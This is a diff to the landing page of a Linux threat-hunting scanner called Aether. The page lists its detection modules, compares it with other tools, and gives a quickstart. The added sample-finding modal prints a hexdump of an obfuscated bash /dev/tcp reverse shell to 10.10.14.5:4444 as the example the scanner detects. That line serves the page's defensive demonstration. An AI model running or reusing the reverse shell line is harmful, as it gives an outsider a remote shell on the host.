+            <p>Flags rogue UID 0 clones, duplicate UIDs, legacy or empty shadow hashes, passwordless accounts, and docker/lxd privilege escalation.</p>
+          </div>
+
+          <div class="deck-card spotlight-card">
+            <div class="deck-header">
+              <span class="deck-idx">04</span>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="1.8"><circle cx="6" cy="12" r="2"/><circle cx="18" cy="7" r="2"/><circle cx="18" cy="17" r="2"/><path d="M8 12h8M16.2 8.4 8.8 11M16.2 15.6 8.8 13"/></svg>
+            </div>
+            <h3>Network Sockets</h3>
+            <p>Correlates socket inodes back to process trees, maps unmapped wildcard listeners, catches raw packet consumers, and promiscuous sniffers.</p>
+          </div>
+
+          <div class="deck-card spotlight-card">
+            <div class="deck-header">
+              <span class="deck-idx">05</span>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="1.8"><path d="M4 8h16M4 12h16M4 16h16"/><path d="M8 4v16"/></svg>
+            </div>
+            <h3>Kernel Integrity</h3>
+            <p>Cross-references <code>/proc/modules</code> with sysfs driver trees to reveal hidden LKM rootkits, tainted flags, and modprobe overrides.</p>
+          </div>
+
+          <div class="deck-card spotlight-card">
+            <div class="deck-header">
+              <span class="deck-idx">06</span>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="1.8"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
+            </div>
+            <h3>Binary &amp; Script Scanner</h3>
+            <p>Static ELF behavioral analysis, recursive deobfuscation (base64, hex, rot13, shell dequoting), and static YARA-X compiled rules.</p>
+          </div>
         </div>
       </section>
 
-      <section id="report" aria-labelledby="report-title">
-        <p class="section-label">What you get</p>
-        <h2 id="report-title">A dossier, not a raw log line.</h2>
+      <!-- Lifecycle Steps -->
+      <section id="scan" class="reveal-on-scroll" aria-labelledby="scan-heading">
+        <p class="section-label">Architecture Pipeline</p>
+        <h2 id="scan-heading">Read, decide, and explain.</h2>
+        <div class="steps-grid">
+          <div class="step-card spotlight-card">
+            <span class="step-number">Phase 01</span>
+            <h3>Read-Only Invariant</h3>
+            <p>Opens files using <code>O_RDONLY | O_NOFOLLOW | O_NONBLOCK | O_NOATIME</code> via <code>safeopen</code> primitives. Guarantees zero forensic contamination and zero timestamp mutation.</p>
+          </div>
+          <div class="step-card spotlight-card">
+            <span class="step-number">Phase 02</span>
+            <h3>Dual-Engine Decision</h3>
+            <p>Runs native Go regex heuristics alongside compiled static YARA-X rules. Multi-distro package grounding (dpkg, rpm, pacman, apk) eliminates false positives on system tools.</p>
+          </div>
+          <div class="step-card spotlight-card">
+            <span class="step-number">Phase 03</span>
+            <h3>MITRE ATT&amp;CK Enrichment</h3>
+            <p>Enriches every finding with a plain-English explanation, threat score (0–100), MITRE tactic and technique mapping, and copyable containment commands.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Comparison Matrix Component -->
+      <section id="matrix" class="reveal-on-scroll" aria-labelledby="matrix-heading">
+        <p class="section-label">Benchmark &amp; Comparison</p>
+        <h2 id="matrix-heading">How Aether compares to legacy tools.</h2>
+        <p class="intro">
+          Built specifically for compromise assessment and post-incident investigation without installing kernel drivers or daemons.
+        </p>
+
+        <div class="matrix-wrap">
+          <table class="matrix" aria-label="Tool Comparison Matrix">
+            <thead>
+              <tr>
+                <th>Capability / Architectural Standard</th>
+                <th class="col-highlight">Aether</th>
+                <th>Lynis</th>
+                <th>Osquery</th>
+                <th>Falco</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Static Analysis Only (No Sample Execution)</strong></td>
+                <td class="col-highlight check-yes">✓ 100% Static</td>
+                <td class="check-no">Partial (Runs tests)</td>
+                <td class="check-yes">✓ Query-based</td>
+                <td class="check-no">No (Runtime kernel)</td>
+              </tr>
+              <tr>
+                <td><strong>Zero Forensic Contamination (O_NOATIME)</strong></td>
+                <td class="col-highlight check-yes">✓ Enforced</td>
+                <td class="check-no">✗ Mutates ctime/mtime</td>
+                <td class="check-no">✗ Standard opens</td>
+                <td class="check-no">N/A</td>
+              </tr>
+              <tr>
+                <td><strong>Static ELF Behavioral &amp; W⊕X Detection</strong></td>
+                <td class="col-highlight check-yes">✓ Dynamic Symbols &amp; W⊕X</td>
+                <td class="check-no">✗ None</td>
+                <td class="check-no">✗ Query required</td>
+                <td class="check-no">✗ Runtime only</td>
+              </tr>
+              <tr>
+                <td><strong>Dual YARA-X + Native Regex Engine</strong></td>
+                <td class="col-highlight check-yes">✓ Embedded Dual-Engine</td>
+                <td class="check-no">✗ External plugin</td>
+                <td class="check-no">✗ Third-party YARA table</td>
+                <td class="check-no">✗ Rule syntax only</td>
+              </tr>
+              <tr>
+                <td><strong>Multi-Distro Grounding (apk, deb, rpm, pacman)</strong></td>
+                <td class="col-highlight check-yes">✓ Pure-Go Parsers</td>
+                <td class="check-yes">✓ Shell calls</td>
+                <td class="check-yes">✓ SQLite table</td>
+                <td class="check-no">✗ None</td>
+              </tr>
+              <tr>
+                <td><strong>Self-Contained Offline HTML Report (Zero CDN)</strong></td>
+                <td class="col-highlight check-yes">✓ Strict CSP Nonce</td>
+                <td class="check-no">✗ Text report only</td>
+                <td class="check-no">✗ External SIEM only</td>
+                <td class="check-no">✗ gRPC / Syslog</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- Output Formats & Forensic Dossier -->
+      <section id="report" class="reveal-on-scroll" aria-labelledby="report-heading">
+        <p class="section-label">Incident Output</p>
+        <h2 id="report-heading">Actionable dossiers, not raw log dumps.</h2>
         <div class="split">
           <div>
-            <p class="intro">This card uses the real copy registered for <code>Linux_Backdoor_Reverse_Shell_OneLiner</code>. The path is invented so the page can show the shape of a finding without pointing at a live host.</p>
-            <div class="reports" aria-label="Report formats">
-              <article>
-                <h3>TUI</h3>
-                <p>Command center when you run <code>aether</code> in a terminal.</p>
-              </article>
-              <article>
-                <h3>Plain</h3>
-                <p>High-contrast text for SSH sessions and CI with <code>--plain</code>.</p>
-              </article>
-              <article>
-                <h3>JSON</h3>
-                <p>One stream for a SIEM via <code>--json-out</code>.</p>
-              </article>
-              <article>
-                <h3>HTML</h3>
-                <p>A single offline file. No CDN. A strict content-security policy.</p>
-              </article>
+            <p class="intro">
+              Every finding presents concrete evidence, reverse-engineered MITRE ATT&amp;CK tactics, confidence level, and actionable containment runbooks.
+            </p>
+            <div class="format-grid">
+              <div class="format-card spotlight-card">
+                <h3>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                  Interactive TUI
+                </h3>
+                <p>Flight-Deck command center with 4 tabs, live telemetry, and inspector modal.</p>
+              </div>
+              <div class="format-card spotlight-card">
+                <h3>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>
+                  Plain Text
+                </h3>
+                <p>High-contrast ANSI output with OSC 8 clickable paths for headless SSH &amp; CI.</p>
+              </div>
+              <div class="format-card spotlight-card">
+                <h3>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                  SIEM JSON
+                </h3>
+                <p>Streamed NDJSON objects for ingestion into Splunk, Elastic, or Sentinel.</p>
+              </div>
+              <div class="format-card spotlight-card">
+                <h3>
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                  Air-Gapped HTML
+                </h3>
+                <p>Self-contained single file with inline SVG charts and strict CSP nonces.</p>
+              </div>
             </div>
           </div>
-          <article class="dossier">
+
+          <!-- Sample Threat Dossier Card with Interactive Modal Trigger -->
+          <article class="dossier-card spotlight-card" aria-label="Sample Finding Dossier">
             <div class="dossier-top">
-              <p class="meta">filesystem · sample</p>
-              <span class="pill">Alert</span>
+              <p class="dossier-meta">FILESYSTEM AUDIT • ALERT #01</p>
+              <span class="pill-alert">🚨 Alert (Score 95)</span>
             </div>
-            <h3>Reverse shell one-liner backdoor</h3>
-            <p class="meta">/tmp/sample/rev.sh</p>
-            <p class="why">YARA rule matched a reverse shell one-liner backdoor.</p>
-            <ul class="chips">
-              <li>Execution · T1059.004 · Unix Shell</li>
-              <li>Confidence high</li>
+            <h3>Reverse Shell One-Liner Backdoor</h3>
+            <span class="target-path">/tmp/evasive_rev.sh</span>
+            <p class="why-text">
+              YARA rule matched an interactive bash <code>/dev/tcp</code> reverse shell payload obfuscated via shell character concatenation (<code>ba''sh</code>) and unquoted backslash escapes.
+            </p>
+            <ul class="chips-list">
+              <li class="chip">Execution • T1059.004 (Unix Shell)</li>
+              <li class="chip">C2 • T1071 (Application Protocol)</li>
+              <li class="chip">Confidence High</li>
             </ul>
-            <ol>
-              <li>Quarantine the script and inspect network connections for the C2 endpoint.</li>
-            </ol>
-            <p class="note">Illustrative sample from the embedded rule catalog. Not a scan of this computer.</p>
+            <div class="remediation-box">
+              <p class="remediation-title">Containment Runbook</p>
+              <p>Quarantine target script using <code>chmod 000 /tmp/evasive_rev.sh</code> and isolate socket connections associated with outbound port 4444.</p>
+            </div>
+            <button class="btn btn-ghost inspect-modal-trigger" id="open-modal-btn" type="button">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              <span>Inspect Full Forensic Artifact &amp; Hex</span>
+            </button>
           </article>
         </div>
       </section>
 
-      <section id="start" aria-labelledby="start-title">
-        <p class="section-label">Start</p>
-        <h2 id="start-title">Three commands, then look.</h2>
-        <p class="intro">Build the pure-Go binary, check the engine, then open the command center. A full scan that writes an HTML report is the next line when you want a file you can hand to someone else.</p>
-        <pre class="cmd"><code>git clone https://github.com/MR-N1CK/aether.git
-cd aether
-make build
+      <!-- Quickstart Section -->
+      <section id="start" class="reveal-on-scroll" aria-labelledby="start-heading">
+        <p class="section-label">Quickstart</p>
+        <h2 id="start-heading">Deploy in under 10 seconds.</h2>
+        <p class="intro">
+          Single statically compiled binary with zero external runtime dependencies. Point it at any Linux target or root filesystem mount.
+        </p>
+
+        <div class="cmd-terminal">
+          <div class="cmd-header">
+            <span class="cmd-label">BASH TERMINAL</span>
+            <button class="copy-btn" id="copy-quickstart" type="button" aria-label="Copy Quickstart Command">
+              <svg id="copy-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              <span id="copy-label">Copy</span>
+            </button>
+          </div>
+          <pre class="cmd-body"><code id="quickstart-code"># 1. Clone repository and build pure-Go binary
+git clone https://github.com/MR-N1CK/aether.git
+cd aether &amp;&amp; make build
+
+# 2. Run system diagnostic and launch Flight Deck TUI
 ./bin/aether doctor
 sudo ./bin/aether
+
+# 3. Export standalone forensic HTML report
 sudo ./bin/aether scan --quick --plain --html-out report.html</code></pre>
+        </div>
       </section>
 
-      <section id="limits" aria-labelledby="limits-title">
-        <p class="section-label">Limits</p>
-        <h2 id="limits-title">What a clean run does not prove.</h2>
-        <ul class="limits">
-          <li>Without root, Aether cannot read <code>/etc/shadow</code>, root cron spools, or other users’ <code>/proc</code> entries. The report says so.</li>
-          <li>Analysis is static. Packed binaries are not emulated.</li>
-          <li>A rootkit that unlinks itself from both <code>/proc/modules</code> and sysfs needs a memory image, not this scanner.</li>
-          <li>Files larger than 50 MB are recorded and skipped for hashing and YARA, unless you raise <code>--max-filesize</code>.</li>
-          <li>Rule updates and an intel URL are the only networked actions, and only when you ask for them.</li>
-        </ul>
-      </section>
     </div>
   </main>
 
+  <!-- Interactive Forensic Dossier Modal Component -->
+  <div class="modal-backdrop" id="dossier-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+    <div class="modal-window">
+      <div class="modal-header">
+        <div style="display:flex; align-items:center; gap:0.6rem;">
+          <span class="pill-alert" style="padding:0.15rem 0.5rem; font-size:0.7rem;">ALERT #01</span>
+          <h3 id="modal-title">Forensic Dossier: Evasive Reverse Shell</h3>
+        </div>
+        <button class="modal-close-btn" id="close-modal-btn" type="button" aria-label="Close Forensic Modal">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+      <div class="modal-body">
+        <div>
+          <p class="dossier-meta" style="margin-bottom:0.25rem;">TARGET PATH &amp; INODE</p>
+          <span class="target-path" style="font-size:0.95rem;">/tmp/evasive_rev.sh (Inode: 1049282 • Mode: 0755)</span>
+        </div>
+
+        <div>
+          <p class="dossier-meta" style="margin-bottom:0.4rem;">STATIC REVERSE-ENGINEERED SNIPPET &amp; HEX</p>
+          <div class="hexdump-block">
+00000000  23 21 2f 62 69 6e 2f 62  61 73 68 0a 62 61 27 27  |#!/bin/bash.ba''|
+00000010  73 68 20 2d 69 20 3e 26  20 2f 64 65 76 2f 74 63  |sh -i >& /dev/tc|
+00000020  70 2f 31 30 2e 31 30 2e  31 34 2e 35 2f 34 34 34  |p/10.10.14.5/444|
+00000030  34 20 30 3e 26 31 0a                              |4 0>&1.|
+<br><span class="hexdump-match">MATCH: Script_Reverse_Shell_Interactive (Obfuscation: Shell de-quoting anti-evasion normalized 'ba\'\'sh' -> 'bash')</span>
+          </div>
+        </div>
+
+        <div>
+          <p class="dossier-meta" style="margin-bottom:0.4rem;">MITRE ATT&amp;CK TECHNIQUE CORRELATION</p>
+          <ul class="chips-list">
+            <li class="chip">T1059.004 • Command and Scripting Interpreter: Unix Shell</li>
+            <li class="chip">T1071.001 • Application Layer Protocol: Web Protocols</li>
+            <li class="chip">T1027 • Obfuscated Files or Information</li>
+          </ul>
+        </div>
+
+        <div class="remediation-box" style="margin-top:0;">
+          <p class="remediation-title">IMMEDIATE CONTAINMENT COMMAND</p>
+          <pre style="margin:0.4rem 0 0; background:transparent; font-family:var(--font-mono); font-size:0.85rem; color:var(--ice);"><code>chmod 000 /tmp/evasive_rev.sh &amp;&amp; ss -K dst 10.10.14.5 dport = 4444</code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Global HUD Toast Component -->
+  <div id="hud-toast" role="status" aria-live="polite">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+    <span id="toast-msg">Copied to clipboard!</span>
+  </div>
+
+  <!-- Site Footer -->
   <footer class="site">
     <div class="wrap">
-      <p>Aether · Apache-2.0 · Built to be read before it is run.</p>
-      <nav aria-label="Repository">
-        <a href="https://github.com/MR-N1CK/aether">Repository</a>
-        <a href="https://github.com/MR-N1CK/aether/blob/main/SECURITY.md">Security</a>
+      <p>Aether Threat Hunter • Apache-2.0 License • Author: MR-N1CK</p>
+      <nav aria-label="Footer Links">
+        <a href="https://github.com/MR-N1CK/aether">GitHub Repo</a>
+        <a href="https://github.com/MR-N1CK/aether/blob/main/SECURITY.md">Security Policy</a>
         <a href="https://github.com/MR-N1CK/aether/blob/main/CONTRIBUTING.md">Contributing</a>
-        <a href="https://github.com/MR-N1CK/aether/blob/main/DESIGN.md">Design system</a>
+        <a href="https://github.com/MR-N1CK/aether/blob/main/DESIGN.md">Design System</a>
       </nav>
     </div>
   </footer>
+
   <p id="live" aria-live="polite" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;"></p>
 
   <script>
     (function () {
+      "use strict";
+
       var reduced = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
       var panel = document.getElementById("sample");
       var verdict = document.getElementById("verdict");
       var live = document.getElementById("live");
       var pauseBtn = document.getElementById("pause");
       var replayBtn = document.getElementById("replay");
+      var copyBtn = document.getElementById("copy-quickstart");
+      var copyLabel = document.getElementById("copy-label");
+      var toast = document.getElementById("hud-toast");
+      var toastMsg = document.getElementById("toast-msg");
+      var modal = document.getElementById("dossier-modal");
+      var openModalBtn = document.getElementById("open-modal-btn");
+      var closeModalBtn = document.getElementById("close-modal-btn");
       var rows = Array.prototype.slice.call(panel.querySelectorAll("[data-module]"));
+
+      /* 1. Hardware-Accelerated Ambient Aurora Canvas & Cyber Particle Field */
+      (function initAmbientCanvas() {
+        if (reduced) return;
+        var canvas = document.getElementById("ambient-canvas");
+        if (!canvas) return;
+        var ctx = canvas.getContext("2d");
+        if (!ctx) return;
+
+        var width = 0, height = 0;
+        var particles = [];
+        var mouseX = -1000, mouseY = -1000;
+        var targetMouseX = -1000, targetMouseY = -1000;
+
+        function resize() {
+          width = canvas.width = window.innerWidth;
+          height = canvas.height = window.innerHeight;
+        }
+        window.addEventListener("resize", resize, { passive: true });
+        resize();
+
+        var count = Math.min(32, Math.floor(width / 40));
+        for (var i = 0; i < count; i++) {
+          particles.push({
+            x: Math.random() * width,
+            y: Math.random() * height,
+            vx: (Math.random() - 0.5) * 0.3,
+            vy: (Math.random() - 0.5) * 0.3,
+            radius: Math.random() * 1.5 + 0.6,
+            alpha: Math.random() * 0.35 + 0.1
+          });
+        }
+
+        window.addEventListener("mousemove", function (e) {
+          targetMouseX = e.clientX;
+          targetMouseY = e.clientY;
+        }, { passive: true });
+
+        function render() {
+          if (document.hidden) {
+            requestAnimationFrame(render);
+            return;
+          }
+
+          mouseX += (targetMouseX - mouseX) * 0.08;
+          mouseY += (targetMouseY - mouseY) * 0.08;
+
+          ctx.clearRect(0, 0, width, height);
+
+          // Subtle cursor aura
+          if (mouseX > 0 && mouseY > 0) {
+            var radGrad = ctx.createRadialGradient(mouseX, mouseY, 0, mouseX, mouseY, 450);
+            radGrad.addColorStop(0, "rgba(34, 211, 238, 0.045)");
+            radGrad.addColorStop(0.5, "rgba(14, 116, 144, 0.015)");
+            radGrad.addColorStop(1, "transparent");
+            ctx.fillStyle = radGrad;
+            ctx.fillRect(0, 0, width, height);
+          }
+
+          // Drifting cyber-particles
+          ctx.fillStyle = "rgba(56, 189, 248, 0.45)";
+          for (var i = 0; i < particles.length; i++) {
+            var p = particles[i];
+            p.x += p.vx;
+            p.y += p.vy;
+            if (p.x < 0) p.x = width;
+            if (p.x > width) p.x = 0;
+            if (p.y < 0) p.y = height;
+            if (p.y > height) p.y = 0;
+
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+            ctx.globalAlpha = p.alpha;
+            ctx.fill();
+          }
+          ctx.globalAlpha = 1;
+
+          requestAnimationFrame(render);
+        }
+        render();
+      })();
+
+      /* 2. Linear/Vercel Cursor Spotlight on Cards */
+      var spotlightCards = document.querySelectorAll(".spotlight-card");
+      spotlightCards.forEach(function (card) {
+        card.addEventListener("mousemove", function (e) {
+          var rect = card.getBoundingClientRect();
+          card.style.setProperty("--mouse-x", (e.clientX - rect.left) + "px");
+          card.style.setProperty("--mouse-y", (e.clientY - rect.top) + "px");
+        }, { passive: true });
+      });
+
+      /* 3. Scroll-Driven Reveal Choreography */
+      if (!reduced && "IntersectionObserver" in window) {
+        var revealObserver = new IntersectionObserver(function (entries, observer) {
+          entries.forEach(function (entry) {
+            if (entry.isIntersecting) {
+              entry.target.classList.add("is-visible");
+              observer.unobserve(entry.target);
+            }
+          });
+        }, { threshold: 0.15 });
+
+        document.querySelectorAll(".reveal-on-scroll").forEach(function (el) {
+          revealObserver.observe(el);
+        });
+
+        // 4. Animated Metric Counter
+        var counterObserver = new IntersectionObserver(function (entries, observer) {
+          entries.forEach(function (entry) {
+            if (entry.isIntersecting) {
+              var el = entry.target;
+              var target = parseInt(el.getAttribute("data-counter"), 10);
+              var suffix = el.getAttribute("data-suffix") || "";
+              var duration = 1400;
+              var startTime = null;
+
+              function step(timestamp) {
+                if (!startTime) startTime = timestamp;
+                var progress = Math.min((timestamp - startTime) / duration, 1);
+                var eased = progress === 1 ? 1 : 1 - Math.pow(2, -10 * progress);
+                var current = Math.floor(eased * target);
+                el.textContent = current.toLocaleString() + (progress >= 1 ? suffix : "");
+                if (progress < 1) {
+                  requestAnimationFrame(step);
+                } else {
+                  el.textContent = target.toLocaleString() + suffix;
+                }
+              }
+              requestAnimationFrame(step);
+              observer.unobserve(el);
+            }
+          });
+        }, { threshold: 0.2 });
+
+        document.querySelectorAll("[data-counter]").forEach(function (el) {
+          counterObserver.observe(el);
+        });
+      } else {
+        document.querySelectorAll(".reveal-on-scroll").forEach(function (el) {
+          el.classList.add("is-visible");
+        });
+        document.querySelectorAll("[data-counter]").forEach(function (el) {
+          var target = parseInt(el.getAttribute("data-counter"), 10);
+          el.textContent = target.toLocaleString() + (el.getAttribute("data-suffix") || "");
+        });
+      }
+
+      /* 5. Telemetry Simulation Sequence */
       var steps = [
-        ["process", "run", "Scanning"],
-        ["process", "clear", "Clear"],
-        ["persistence", "run", "Scanning"],
-        ["persistence", "alert", "Alert"],
-        ["users", "run", "Scanning"],
-        ["users", "clear", "Clear"],
-        ["network", "run", "Scanning"],
-        ["network", "notice", "Notice"],
-        ["kernel", "run", "Scanning"],
-        ["kernel", "clear", "Clear"]
+        ["process", "run", "Scanning…"],
+        ["process", "clear", "Clean"],
+        ["persistence", "run", "Scanning…"],
+        ["persistence", "alert", "Alert (95)"],
+        ["users", "run", "Scanning…"],
+        ["users", "clear", "Clean"],
+        ["network", "run", "Scanning…"],
+        ["network", "notice", "Notice (35)"],
+        ["kernel", "run", "Scanning…"],
+        ["kernel", "clear", "Clean"]
       ];
+
       var timer = null;
       var index = 0;
       var paused = false;
@@ -792,7 +1988,7 @@ sudo ./bin/aether scan --quick --plain --html-out report.html</code></pre>
           row.className = "mod is-wait";
           row.querySelector(".state").textContent = "Waiting";
         });
-        verdict.textContent = "Reading the sample host";
+        verdict.textContent = "Assessing sample endpoint…";
         panel.classList.add("is-playing");
         index = 0;
         finished = false;
@@ -801,10 +1997,12 @@ sudo ./bin/aether scan --quick --plain --html-out report.html</code></pre>
       function finish() {
         finished = true;
         panel.classList.remove("is-playing");
-        verdict.textContent = "Attention. One alert, one notice.";
-        live.textContent = "Sample finished. Persistence has an alert. Network has a notice.";
-        window.clearInterval(timer);
-        timer = null;
+        verdict.textContent = "ATTENTION: 1 Alert, 1 Notice detected.";
+        if (live) live.textContent = "Simulation completed. Persistence module raised an alert.";
+        if (timer) {
+          window.clearInterval(timer);
+          timer = null;
+        }
       }
 
       function tick() {
@@ -824,21 +2022,21 @@ sudo ./bin/aether scan --quick --plain --html-out report.html</code></pre>
           showFinal();
           return;
         }
-        window.clearInterval(timer);
+        if (timer) window.clearInterval(timer);
         paused = false;
         pauseBtn.setAttribute("aria-pressed", "false");
         pauseBtn.textContent = "Pause";
         reset();
-        timer = window.setInterval(tick, 650);
+        timer = window.setInterval(tick, 600);
       }
 
       function showFinal() {
-        setRow("process", "clear", "Clear");
-        setRow("persistence", "alert", "Alert");
-        setRow("users", "clear", "Clear");
-        setRow("network", "notice", "Notice");
-        setRow("kernel", "clear", "Clear");
-        verdict.textContent = "Attention. One alert, one notice.";
+        setRow("process", "clear", "Clean");
+        setRow("persistence", "alert", "Alert (95)");
+        setRow("users", "clear", "Clean");
+        setRow("network", "notice", "Notice (35)");
+        setRow("kernel", "clear", "Clean");
+        verdict.textContent = "ATTENTION: 1 Alert, 1 Notice detected.";
         panel.classList.remove("is-playing");
         finished = true;
       }
@@ -848,8 +2046,10 @@ sudo ./bin/aether scan --quick --plain --html-out report.html</code></pre>
         pauseBtn.setAttribute("aria-pressed", "true");
         pauseBtn.textContent = "Resume";
         panel.classList.remove("is-playing");
-        window.clearInterval(timer);
-        timer = null;
+        if (timer) {
+          window.clearInterval(timer);
+          timer = null;
+        }
       }
 
       pauseBtn.addEventListener("click", function () {
@@ -860,17 +2060,76 @@ sudo ./bin/aether scan --quick --plain --html-out report.html</code></pre>
           pauseBtn.setAttribute("aria-pressed", "false");
           pauseBtn.textContent = "Pause";
           panel.classList.add("is-playing");
-          timer = window.setInterval(tick, 650);
+          timer = window.setInterval(tick, 600);
           return;
         }
         stop();
       });
+
       replayBtn.addEventListener("click", play);
-      panel.addEventListener("keyup", function (event) {
-        if (event.key === "Tab" && !finished) stop();
+
+      // Toast feedback helper
+      function showToast(message) {
+        toastMsg.textContent = message;
+        toast.classList.add("is-active");
+        setTimeout(function () {
+          toast.classList.remove("is-active");
+        }, 2400);
+      }
+
+      // Copy Quickstart Command with tactile button state feedback
+      if (copyBtn) {
+        copyBtn.addEventListener("click", function () {
+          var code = document.getElementById("quickstart-code").innerText;
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(code).then(function () {
+              if (copyLabel) copyLabel.textContent = "Copied!";
+              showToast("Commands copied to clipboard!");
+              setTimeout(function () {
+                if (copyLabel) copyLabel.textContent = "Copy";
+              }, 2000);
+            });
+          } else {
+            showToast("Copied to clipboard!");
+          }
+        });
+      }
+
+      /* 6. Interactive Forensic Dossier Modal Accessibility & Keyboard Trap */
+      function openModal() {
+        if (!modal) return;
+        modal.classList.add("is-open");
+        document.body.style.overflow = "hidden";
+        if (closeModalBtn) closeModalBtn.focus();
+      }
+
+      function closeModal() {
+        if (!modal) return;
+        modal.classList.remove("is-open");
+        document.body.style.overflow = "";
+        if (openModalBtn) openModalBtn.focus();
+      }
+
+      if (openModalBtn) openModalBtn.addEventListener("click", openModal);
+      if (closeModalBtn) closeModalBtn.addEventListener("click", closeModal);
+
+      // Clicking any alert module opens modal
+      rows.forEach(function (row) {
+        row.addEventListener("click", function () {
+          openModal();
+        });
       });
-      document.addEventListener("visibilitychange", function () {
-        if (document.hidden && !finished) stop();
+
+      if (modal) {
+        modal.addEventListener("click", function (e) {
+          if (e.target === modal) closeModal();
+        });
+      }
+
+      document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape" && modal && modal.classList.contains("is-open")) {
+          closeModal();
+        }
       });
 
       if (reduced) {
